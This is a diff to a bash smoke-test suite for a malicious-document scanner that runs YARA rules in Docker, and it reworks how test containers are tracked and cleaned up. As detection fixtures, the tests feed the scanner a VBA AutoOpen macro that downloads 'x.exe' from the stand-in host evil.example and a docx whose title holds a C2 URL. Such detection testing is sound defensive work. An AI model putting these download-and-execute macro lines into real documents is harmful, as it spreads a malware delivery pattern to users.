@@ -19,22 +19,51 @@
 # Must run from the repo root (reads docker/local-rules/*).
 set -euo pipefail
 
-IMG="${1:-strixd:ci}"
-
-# Track every container/volume we create so a failure mid-suite still cleans up.
-_names=""
-_vols=""
-cleanup() {
-  if [ -n "$_names" ]; then
-    # shellcheck disable=SC2086  # word-splitting the tracked name list is intended
-    docker rm -f $_names >/dev/null 2>&1 || true
-  fi
-  if [ -n "$_vols" ]; then
-    # shellcheck disable=SC2086  # word-splitting the tracked vol list is intended
-    docker volume rm $_vols >/dev/null 2>&1 || true
-  fi
+# Resource states: absent -> created (private cidfile) -> started -> removed.
+# Docker create records the immutable ID before start, which may fail after
+# creation. Cleanup also reads cidfiles left by a failed/partial create. Names
+# are for diagnostics only: every later Docker operation uses the full ID.
+# The unique run label must still match; stale IDs never authorize a replacement
+# container with the same name. Generated files stay in our mktemp directory.
+# These helpers are also sourced by the polling contract at the end of the suite.
+smoke_resources_init() {
+  _workspace=$(mktemp -d "${TMPDIR:-/tmp}/mailstrix-smoke.XXXXXXXXXX")
+  _run="mailstrix-smoke-${_workspace##*.}"
+  trap cleanup EXIT
 }
-trap cleanup EXIT
+
+remove_container() {
+  local id=$1 owner
+  [[ "$id" =~ ^[a-f0-9]{64}$ ]] || return 1
+  owner=$(docker inspect --type container -f '{{ index .Config.Labels "myguard.run" }}' "$id" 2>/dev/null) || return 0
+  [[ "$owner" == "$_run" ]] || return 1
+  docker rm -f "$id"
+}
+
+cleanup() {
+  local cidfile id
+  [[ -d ${_workspace:-} ]] || return 0
+  for cidfile in "$_workspace"/*.cid; do
+    [[ -f $cidfile ]] || continue
+    id=$(cat "$cidfile")
+    remove_container "$id" >/dev/null 2>&1 || true
+  done
+  rm -rf -- "${_workspace:?}"
+}
+
+create_container() {
+  local name=$1
+  shift
+  docker create --cidfile "$_workspace/$name.cid" --label "myguard.run=$_run" \
+    --name "$_run-$name" "$@" >/dev/null
+  _container=$(cat "$_workspace/$name.cid")
+  [[ "$_container" =~ ^[a-f0-9]{64}$ ]]
+}
+
+start_container() {
+  create_container "$@"
+  docker start "$_container"
+}
 
 # wait_healthy NAME [TRIES] — block until the container reports healthy.
 wait_healthy() {
@@ -51,13 +80,12 @@ wait_healthy() {
 # start_rule NAME PORT RULEFILE — run the image with ONE isolated rule, cache off.
 start_rule() {
   name=$1; port=$2; rule=$3
-  dir="rules-$name"
+  dir="$_workspace/rules-$name"
   mkdir -p "$dir"
   cp "docker/local-rules/$rule" "$dir/"
-  _names="$_names $name"
-  docker run -d -e MAILSTRIX_RULES_POLL_INTERVAL=0 --name "$name" -e MAILSTRIX_TOKEN=ci -e MAILSTRIX_RULES= -e MAILSTRIX_RULES_DIR=/r -e MAILSTRIX_CACHE_DIR= \
-    -v "$PWD/$dir:/r:ro" -p "$port:8079" "$IMG"
-  wait_healthy "$name"
+  start_container "$name" -e MAILSTRIX_RULES_POLL_INTERVAL=0 -e MAILSTRIX_TOKEN=ci -e MAILSTRIX_RULES= -e MAILSTRIX_RULES_DIR=/r -e MAILSTRIX_CACHE_DIR= \
+    -v "$dir:/r:ro" -p "$port:8079" "$IMG"
+  wait_healthy "$_container"
 }
 
 # scan PORT [extra curl args...] reads the body from stdin and prints the verdict.
@@ -71,17 +99,16 @@ say() { printf '\n=== smoke: %s ===\n' "$1"; }
 # ---------------------------------------------------------------------------
 smoke_eicar() {
   say "EICAR rule, scan/clean/auth/health/metrics"
-  mkdir -p rules
-  cat > rules/eicar.yar <<'YAR'
+  mkdir "$_workspace/rules"
+  cat > "$_workspace/rules/eicar.yar" <<'YAR'
 rule EICAR_Test_File : test {
   strings: $e = "$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!"
   condition: $e
 }
 YAR
-  _names="$_names yc"
-  docker run -d -e MAILSTRIX_RULES_POLL_INTERVAL=0 --name yc -e MAILSTRIX_TOKEN=ci -e MAILSTRIX_RULES= -e MAILSTRIX_RULES_DIR=/r -e MAILSTRIX_CACHE_DIR= \
-    -v "$PWD/rules:/r:ro" -p 18079:8079 "$IMG"
-  wait_healthy yc
+  start_container yc -e MAILSTRIX_RULES_POLL_INTERVAL=0 -e MAILSTRIX_TOKEN=ci -e MAILSTRIX_RULES= -e MAILSTRIX_RULES_DIR=/r -e MAILSTRIX_CACHE_DIR= \
+    -v "$_workspace/rules:/r:ro" -p 18079:8079 "$IMG"
+  wait_healthy "$_container"
 
   # build the EICAR body at runtime (don't ship the literal signature)
   # shellcheck disable=SC2016  # the $-segments are the literal EICAR token, must NOT expand
@@ -102,7 +129,7 @@ YAR
   m=$(curl -s http://127.0.0.1:18079/metrics); grep -q 'mailstrix_rules 1' <<<"$m"
   r=$(curl -s http://127.0.0.1:18079/ready);   grep -q ready <<<"$r"
   v=$(curl -s http://127.0.0.1:18079/version); grep -q extractor_version <<<"$v"
-  docker rm -f yc
+  remove_container "$_container"
 }
 
 smoke_maldoc() {
@@ -131,7 +158,7 @@ smoke_maldoc() {
   fhl_body=$(printf 'Sub AutoOpen()\n  Set o = CreateObject("ADODB.Stream")\n  o.SaveToFile "x.exe"\n  ActiveWorkbook.FollowHyperlink "http://evil.example/x.exe"\nEnd Sub\n')
   fhl_match=$(printf '%s' "$fhl_body" | scan 18081)
   echo "fhl_match: $fhl_match"; grep -q Maldoc_AutoExec_Write_Execute <<<"$fhl_match"
-  docker rm -f ym
+  remove_container "$_container"
 }
 
 smoke_suspicious() {
@@ -154,7 +181,7 @@ smoke_suspicious() {
   # Declare+API pair must NOT fire either rule.
   clean=$(printf 'Set o = CreateObject("Scripting.Dictionary")\n  MsgBox "hello"\n' | scan 18082)
   echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
-  docker rm -f yk
+  remove_container "$_container"
 }
 
 smoke_ooxml_template() {
@@ -170,7 +197,7 @@ smoke_ooxml_template() {
   # Negative: plain body with no marker must NOT fire.
   clean=$(printf 'just a plain document body\n' | scan 18083)
   echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
-  docker rm -f yo
+  remove_container "$_container"
 }
 
 smoke_ooxml_dde() {
@@ -186,7 +213,7 @@ smoke_ooxml_dde() {
   # Negative: plain body with no marker must NOT fire.
   clean=$(printf 'just a plain document body\n' | scan 18084)
   echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
-  docker rm -f yd
+  remove_container "$_container"
 }
 
 smoke_xlm_hidden() {
@@ -202,7 +229,7 @@ smoke_xlm_hidden() {
   # Negative: plain body with no marker must NOT fire.
   clean=$(printf 'just a plain document body\n' | scan 18087)
   echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
-  docker rm -f yxlm
+  remove_container "$_container"
 }
 
 smoke_xlm_dangerous() {
@@ -233,7 +260,7 @@ smoke_xlm_dangerous() {
   # Negative: plain body with no marker must NOT fire.
   clean=$(printf 'just a plain document body\n' | scan 18094)
   echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
-  docker rm -f yxlmd
+  remove_container "$_container"
 }
 
 smoke_vba_stomping() {
@@ -248,7 +275,7 @@ smoke_vba_stomping() {
   # Negative: plain body with no marker must NOT fire.
   clean=$(printf 'just a plain document body\n' | scan 18088)
   echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
-  docker rm -f ystomp
+  remove_container "$_container"
 }
 
 smoke_equation_editor() {
@@ -269,7 +296,7 @@ smoke_equation_editor() {
   # Negative: no OLE2 magic → no match.
   clean=$(printf 'Equation Native in plain text\n' | scan 18089)
   echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
-  docker rm -f yeq
+  remove_container "$_container"
 }
 
 smoke_userform() {
@@ -290,7 +317,7 @@ smoke_userform() {
   # Negative: plain body with no marker must NOT fire.
   clean=$(printf 'just a plain document body\n' | scan 18090)
   echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
-  docker rm -f yuf
+  remove_container "$_container"
 }
 
 smoke_docprops() {
@@ -302,18 +329,19 @@ smoke_docprops() {
   # it with the DOCPROPS-STRINGS marker in ONE buffer, and routes that to
   # the out-of-band Markers channel where the (: marker)-tagged
   # Maldoc_DocProps_Payload rule fires.
-  python3 - <<'PY'
+  python3 - "$_workspace/s.docx" <<'PY'
+import sys
 import zipfile
 core = ('<?xml version="1.0"?><cp:coreProperties '
         'xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties">'
         '<dc:title xmlns:dc="http://purl.org/dc/elements/1.1/">http://evil.example/c2</dc:title>'
         '</cp:coreProperties>')
-with zipfile.ZipFile('/tmp/s.docx', 'w') as z:
+with zipfile.ZipFile(sys.argv[1], 'w') as z:
     z.writestr('[Content_Types].xml', '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
     z.writestr('docProps/core.xml', core)
 PY
   fn=$(printf 's.docx' | base64 -w0)
-  match=$(curl -s -H "X-MAILSTRIX-Token: ci" -H "X-MAILSTRIX-Filename: $fn" --data-binary @/tmp/s.docx http://127.0.0.1:18091/scan)
+  match=$(curl -s -H "X-MAILSTRIX-Token: ci" -H "X-MAILSTRIX-Filename: $fn" --data-binary "@$_workspace/s.docx" http://127.0.0.1:18091/scan)
   echo "match: $match"; grep -q Maldoc_DocProps_Payload <<<"$match"
 
   # Adversarial: a RAW body planting the marker literal + IOC must NOT fire
@@ -324,7 +352,7 @@ PY
   # Negative: plain body with no marker must NOT fire.
   clean=$(printf 'just a plain document body\n' | scan 18091)
   echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
-  docker rm -f ydp
+  remove_container "$_container"
 }
 
 smoke_intent() {
@@ -356,43 +384,50 @@ smoke_intent() {
   # Negative: bare mentions without abusive args/combos must NOT fire.
   clean=$(printf 'newsletter about powershell and regsvr32 for admins\n' | scan 18086)
   echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
-  docker rm -f yi
+  remove_container "$_container"
 }
 
 smoke_seed_startup() {
   say "seed-on-startup — default cache config + wiped-cache self-heal"
-  # A named volume for the cache so we can wipe it from the host side
-  # (the distroless image has no shell/rm to do it in-container).
-  docker volume create yc-cache >/dev/null
-  _vols="$_vols yc-cache"
+  local cache="$_workspace/cache" seed
+  # A private bind directory avoids volume-create's existing-name reuse and
+  # volume deletion by a reusable name. Only this invocation can write it.
+  mkdir "$cache"
+  chmod 0777 "$cache" # the image's nonroot UID writes inside this private mount
   # Default config: no MAILSTRIX_RULES/_DIR overrides, so the image seeds
   # /var/cache/mailstrix from the baked /usr/share/mailstrix seed and serves it.
-  _names="$_names ys"
-  docker run -d -e MAILSTRIX_RULES_POLL_INTERVAL=0 --name ys -e MAILSTRIX_TOKEN=ci -v yc-cache:/var/cache/mailstrix \
+  start_container ys -e MAILSTRIX_RULES_POLL_INTERVAL=0 -e MAILSTRIX_TOKEN=ci -v "$cache:/var/cache/mailstrix" \
     -p 18080:8079 "$IMG"
-  wait_healthy ys 60
+  seed=$_container
+  wait_healthy "$seed" 60
   # Read into a var first: `docker logs … | grep -q` lets grep exit on the
   # first match and SIGPIPE docker-logs (exit 141) under `set -o pipefail`
   # — the flake that reddened PR #31. Assigning first avoids the pipe.
-  logs=$(docker logs ys 2>&1); grep -q 'seeded rules cache' <<<"$logs"
+  logs=$(docker logs "$seed" 2>&1); grep -q 'seeded rules cache' <<<"$logs"
   rules=$(curl -s http://127.0.0.1:18080/metrics | grep '^mailstrix_rules ' | awk '{print $2}')
   echo "seeded rules: $rules"; [ "${rules:-0}" -gt 0 ]
 
-  # Self-heal: wipe the cache volume from the host, restart; it must reseed.
-  docker stop ys >/dev/null
-  docker run --rm -v yc-cache:/c busybox sh -c 'rm -rf /c/*'
-  docker start ys >/dev/null
-  wait_healthy ys 60
+  # Self-heal: wipe the private cache from a helper, restart; it must reseed.
+  docker stop "$seed" >/dev/null
+  create_container wipe -v "$cache:/c" busybox sh -c 'rm -rf /c/*'
+  docker start --attach "$_container"
+  [ "$(docker wait "$_container")" = 0 ]
+  remove_container "$_container"
+  docker start "$seed" >/dev/null
+  wait_healthy "$seed" 60
   # Seeded a second time after the wipe. Capture the count into a var — do
   # NOT pipe `grep -c` into `grep -q`, which closes the pipe early and
   # SIGPIPEs grep -c (exit 141) under `bash -e`.
-  seeds=$(docker logs ys 2>&1 | grep -c 'seeded rules cache' || true)
+  seeds=$(docker logs "$seed" 2>&1 | grep -c 'seeded rules cache' || true)
   echo "seed count: $seeds"; [ "$seeds" -ge 2 ]
   r=$(curl -s http://127.0.0.1:18080/ready); grep -q ready <<<"$r"
-  docker rm -f ys; docker volume rm yc-cache
+  remove_container "$seed"
 }
 
 # ---------------------------------------------------------------------------
+if [[ ${BASH_SOURCE[0]} == "$0" ]]; then
+IMG="${1:-strixd:ci}"
+smoke_resources_init
 smoke_eicar
 smoke_maldoc
 smoke_suspicious
@@ -409,3 +444,4 @@ smoke_seed_startup
 bash ci/rules_polling_test.sh "$IMG"
 
 printf '\n=== smoke: ALL OK ===\n'
+fi
